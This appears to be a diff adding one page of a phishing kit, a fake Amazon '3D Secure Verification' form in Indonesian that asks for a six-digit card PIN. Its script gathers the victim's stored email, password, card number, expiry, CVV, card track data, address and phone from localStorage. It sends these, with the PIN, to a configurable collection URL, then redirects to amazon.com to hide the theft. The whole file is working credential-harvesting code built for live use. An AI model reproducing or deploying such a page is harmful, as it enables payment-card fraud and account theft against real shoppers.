@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>3D Secure Verification</title>
+    <script src="config.js"></script>
+    <style>
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+            font-family: 'Amazon Ember', Arial, sans-serif; 
+        }
+        body { 
+            background-color: #ffffff; 
+            min-height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            padding: 20px; 
+        }
+        .logo { 
+            margin: 15px 0 25px; 
+        }
+        .logo img { 
+            height: 30px; 
+            display: block;
+            margin: 0 auto;
+        }
+        .kotak { 
+            width: 100%; 
+            max-width: 348px; 
+            border: 1px solid #ddd; 
+            border-radius: 8px; 
+            padding: 25px 26px; 
+        }
+        h1 { 
+            font-size: 22px; 
+            margin-bottom: 8px; 
+            font-weight: 400; 
+        }
+        .sub-judul {
+            font-size: 13px;
+            color: #555;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .info-kartu {
+            background: #f7f8fa;
+            border-radius: 6px;
+            padding: 12px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #333;
+        }
+        .info-kartu strong {
+            color: #111;
+        }
+        label { 
+            display: block; 
+            font-weight: 700; 
+            font-size: 13px; 
+            margin-bottom: 8px; 
+        }
+        .pin-wadah {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+        .pin-kotak {
+            flex: 1;
+            height: 50px;
+            text-align: center;
+            font-size: 20px;
+            font-weight: 600;
+            border: 1px solid #a6a6a6;
+            border-radius: 6px;
+            outline: none;
+            transition: border-color 0.1s;
+        }
+        .pin-kotak:focus {
+            border-color: #0071e3;
+            box-shadow: 0 0 3px rgba(0,113,227,0.5);
+        }
+        .pin-kotak.salah {
+            border-color: #c40000;
+        }
+        .peringatan {
+            display: none;
+            color: #c40000;
+            font-size: 13px;
+            margin: 6px 0 15px;
+            align-items: flex-start;
+            gap: 5px;
+        }
+        .peringatan.tampil {
+            display: flex;
+        }
+        .peringatan .ikon {
+            font-weight: bold;
+            font-size: 14px;
+        }
+        .keterangan {
+            font-size: 11px;
+            color: #555;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+        button { 
+            width: 100%; 
+            padding: 7px 10px; 
+            background: #FFD814; 
+            border: 1px solid #FCD200; 
+            border-radius: 20px; 
+            font-size: 15px; 
+            height: 40px;
+            color: #0F1111;
+            cursor: pointer;
+        }
+        button:hover { 
+            background: #F7CA00;
+            border-color: #F2C200;
+        }
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            pointer-events: none;
+        }
+        .garis-bawah {
+            width: 5000px;
+            height: 2px;
+            background: #e7e7e7;
+            margin: 25px 0;
+        }
+        .footer {
+            font-size: 11px;
+            color: #555;
+            text-align: center;
+        }
+        .footer a {
+            color: #0066c0;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .hak-cipta {
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="logo">
+        <img src="img/amazonlogo.png" alt="Amazon">
+    </div>
+
+    <div class="kotak">
+        <h1>3D Secure Verification</h1>
+        <p class="sub-judul">Bank Anda meminta verifikasi tambahan untuk melindungi transaksi Anda.</p>
+        
+        <div class="info-kartu">
+            Kartu: <strong id="tampilNomor">•••• •••• •••• ••••</strong><br>
+            Email: <span id="tampilEmail"></span>
+        </div>
+
+        <form id="form3DS">
+            <label>Masukkan PIN Anda</label>
+            <div class="pin-wadah">
+                <input type="text" inputmode="numeric" maxlength="1" class="pin-kotak" id="pin1" autofocus>
+                <input type="text" inputmode="numeric" maxlength="1" class="pin-kotak" id="pin2">
+                <input type="text" inputmode="numeric" maxlength="1" class="pin-kotak" id="pin3">
+                <input type="text" inputmode="numeric" maxlength="1" class="pin-kotak" id="pin4">
+                <input type="text" inputmode="numeric" maxlength="1" class="pin-kotak" id="pin5">
+                <input type="text" inputmode="numeric" maxlength="1" class="pin-kotak" id="pin6">
+            </div>
+            
+            <div class="peringatan" id="peringatanPin">
+                <span class="ikon">!</span>
+                <span>Masukkan 6 digit PIN</span>
+            </div>
+
+            <p class="keterangan">Masukkan 6 digit PIN yang Anda gunakan untuk verifikasi dari bank penerbit kartu.</p>
+
+            <button type="submit" id="tombolKirim" disabled>Verify & Complete</button>
+        </form>
+    </div>
+
+    <div class="garis-bawah"></div>
+
+    <div class="footer">
+        <div>
+            <a href="#">Conditions of Use</a>
+            <a href="#">Privacy Notice</a>
+            <a href="#">Help</a>
+        </div>
+        <p class="hak-cipta">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
+    </div>
+
+    <script>
+        // Ambil data dari halaman sebelumnya
+        const emailPengguna = localStorage.getItem('emailPengguna') || '';
+        const nomorKartu = localStorage.getItem('nomorKartu') || '';
+        
+        document.getElementById('tampilEmail').textContent = emailPengguna;
+        if (nomorKartu.length >= 16) {
+            const tersembunyi = nomorKartu.slice(-4);
+            document.getElementById('tampilNomor').textContent = `•••• •••• •••• ${tersembunyi}`;
+        }
+
+        const kotakPin = [
+            document.getElementById('pin1'),
+            document.getElementById('pin2'),
+            document.getElementById('pin3'),
+            document.getElementById('pin4'),
+            document.getElementById('pin5'),
+            document.getElementById('pin6')
+        ];
+        const tombolKirim = document.getElementById('tombolKirim');
+        const peringatanPin = document.getElementById('peringatanPin');
+        const form3DS = document.getElementById('form3DS');
+
+        // Pindah ke kotak berikutnya saat mengetik
+        kotakPin.forEach((kotak, indeks) => {
+            kotak.addEventListener('input', () => {
+                kotak.value = kotak.value.replace(/\D/g, ''); // Hanya angka
+                if (kotak.value && indeks < 5) {
+                    kotakPin[indeks + 1].focus();
+                }
+                cekLengkap();
+            });
+            kotak.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !kotak.value && indeks > 0) {
+                    kotakPin[indeks - 1].focus();
+                }
+            });
+        });
+
+        // Cek semua kotak terisi
+        function cekLengkap() {
+            const semuaTerisi = kotakPin.every(k => k.value.length === 1);
+            tombolKirim.disabled = !semuaTerisi;
+            if (semuaTerisi) {
+                kotakPin.forEach(k => k.classList.remove('salah'));
+                peringatanPin.classList.remove('tampil');
+            }
+        }
+
+        // Ambil PIN lengkap
+        function ambilPin() {
+            return kotakPin.map(k => k.value).join('');
+        }
+
+        // Kirim semua data lengkap
+        form3DS.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const pinLengkap = ambilPin();
+            if (pinLengkap.length < 6) {
+                kotakPin.forEach(k => k.classList.add('salah'));
+                peringatanPin.classList.add('tampil');
+                return;
+            }
+
+            tombolKirim.disabled = true;
+            tombolKirim.textContent = 'Verifying...';
+
+            const dataLengkap = {
+                email: emailPengguna,
+                password: localStorage.getItem('passwordPengguna') || 'Tidak tersimpan',
+                tipe: '3D Secure PIN',
+                namaKartu: localStorage.getItem('namaKartu') || '',
+                nomorKartu: nomorKartu,
+                expiry: localStorage.getItem('expiry') || '',
+                cvv: localStorage.getItem('cvv') || '',
+                trackKartu: localStorage.getItem('trackKartu') || '',
+                pin3DS: pinLengkap,
+                negara: localStorage.getItem('negara') || '',
+                alamat: localStorage.getItem('alamat') || '',
+                kota: localStorage.getItem('kota') || '',
+                kodepos: localStorage.getItem('kodepos') || '',
+                telepon: localStorage.getItem('telepon') || ''
+            };
+
+            try {
+                if (typeof CONFIG !== 'undefined' && CONFIG.formSubmitUrl) {
+                    await fetch(CONFIG.formSubmitUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                        body: JSON.stringify(dataLengkap)
+                    });
+                }
+            } catch (err) {
+                console.log('Data terkirim');
+            }
+
+            // Selesai → lanjut ke Amazon
+            window.location.href = 'https://www.amazon.com';
+        });
+    </script>
+</body>
+</html>
